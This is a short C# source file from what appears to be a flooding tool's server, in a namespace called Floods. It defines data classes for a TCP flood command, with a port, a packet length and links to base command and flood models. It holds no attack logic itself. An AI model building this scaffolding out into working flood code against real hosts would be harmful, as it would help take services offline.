using System;
using System.Collections.Generic;
using System.Text;

namespace Alduin.Server.Commands.Floods
{
    public class TcpCommand
    {
        public TcpVariables newTcpVariables { get; set; }
        public BaseCommands newBaseCommand { get; set; }
        public BaseFloodModel newBaseFloodModel { get; set; }
    }

    public class TcpVariables
    {
        public int Port { get; set; }
        public int Length { get; set; }

    }
}
